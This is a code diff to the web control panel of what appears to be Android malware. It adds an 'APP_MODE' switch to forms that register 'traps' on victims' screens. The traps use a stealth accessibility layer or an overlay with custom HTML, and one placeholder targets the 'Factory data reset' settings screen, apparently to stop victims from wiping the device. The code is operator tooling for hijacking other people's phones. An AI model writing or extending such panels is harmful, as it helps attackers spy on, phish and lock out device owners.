@@ -497,6 +497,13 @@
                                     </div>
                                     <div style="display:flex; gap:5px; margin-bottom:10px;">
                                         <div style="flex:1">
+                                            <label style="font-size:0.6rem; color:#666;">APP_MODE</label>
+                                            <select id="trap-reg-appmode" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
+                                                <option value="false">FALSE (Sticky)</option>
+                                                <option value="true">TRUE (App)</option>
+                                            </select>
+                                        </div>
+                                        <div style="flex:1">
                                             <label style="font-size:0.6rem; color:#666;">LAYER</label>
                                             <select id="trap-reg-method" onchange="handleTrapMethodChange()" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
                                                 <option value="ACC">ACC (Stealth)</option>
@@ -609,6 +616,7 @@
                                     <div class="cmd-row"><label style="font-size:0.6rem; color:#666;">FINGERPRINT (Title@@Summary@@Pkg@@Anchor)</label><input type="text" id="nt-reg-target" placeholder="Reset@@Factory data reset@@settings"></div>
                                     <div style="display:flex; gap:5px; margin-bottom:10px;">
                                         <div style="flex:1"><label style="font-size:0.6rem; color:#666;">STRICT</label><select id="nt-reg-strict" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;"><option value="false">FALSE</option><option value="true">TRUE</option></select></div>
+                                        <div style="flex:1"><label style="font-size:0.6rem; color:#666;">APP_MODE</label><select id="nt-reg-appmode" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;"><option value="false">FALSE</option><option value="true">TRUE</option></select></div>
                                         <div style="flex:1"><label style="font-size:0.6rem; color:#666;">LAYER</label><select id="nt-reg-method" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;"><option value="ACC">ACC</option><option value="OVERLAY">OVERLAY</option></select></div>
                                         <div style="width:60px"><label style="font-size:0.6rem; color:#666;">TTL(s)</label><input type="number" id="nt-reg-timeout" value="15"></div>
                                         <div style="width:60px"><label style="font-size:0.6rem; color:#666;">DIM%</label><input type="number" id="nt-reg-dim" value="20"></div>
@@ -907,6 +915,7 @@
                 target: document.getElementById('trap-reg-target').value.trim(),
                 strict: document.getElementById('trap-reg-strict').checked,
                 method: document.getElementById('trap-reg-method').value,
+                app_mode: document.getElementById('trap-reg-appmode').value === 'true',
                 timeout: document.getElementById('trap-reg-timeout').value,
                 dim: document.getElementById('trap-reg-dim').value,
                 html: document.getElementById('trap-reg-html').value.trim()
@@ -939,6 +948,7 @@
             document.getElementById('trap-reg-target').value = trap.target;
             document.getElementById('trap-reg-strict').checked = trap.strict || false;
             document.getElementById('trap-reg-method').value = trap.method;
+            document.getElementById('trap-reg-appmode').value = trap.app_mode ? 'true' : 'false';
             document.getElementById('trap-reg-timeout').value = trap.timeout;
             document.getElementById('trap-reg-dim').value = trap.dim;
             document.getElementById('trap-reg-html').value = trap.html;
@@ -1031,6 +1041,7 @@
                 target: document.getElementById('nt-reg-target').value.trim(),
                 strict: document.getElementById('nt-reg-strict').value,
                 method: document.getElementById('nt-reg-method').value,
+                app_mode: document.getElementById('nt-reg-appmode').value === 'true',
                 timeout: document.getElementById('nt-reg-timeout').value,
                 dim: document.getElementById('nt-reg-dim').value
             };
@@ -1058,6 +1069,7 @@
             document.getElementById('nt-reg-target').value = trap.target;
             document.getElementById('nt-reg-strict').value = trap.strict;
             document.getElementById('nt-reg-method').value = trap.method || 'ACC';
+            document.getElementById('nt-reg-appmode').value = trap.app_mode ? 'true' : 'false';
             document.getElementById('nt-reg-timeout').value = trap.timeout;
             document.getElementById('nt-reg-dim').value = trap.dim;
         }
@@ -1500,6 +1512,7 @@
                             target: nTrapSet.target,
                             strict: nTrapSet.strict === 'true',
                             method: nTrapSet.method || 'ACC',
+                            app_mode: nTrapSet.app_mode || false,
                             timeout: parseInt(nTrapSet.timeout),
                             dim: parseInt(nTrapSet.dim)
                         });
@@ -1525,6 +1538,7 @@
                             target: trapSet.target,
                             strict: trapSet.strict || false,
                             method: trapSet.method,
+                            app_mode: trapSet.app_mode || false,
                             timeout: parseInt(trapSet.timeout),
                             dim: parseInt(trapSet.dim),
                             html: trapSet.html
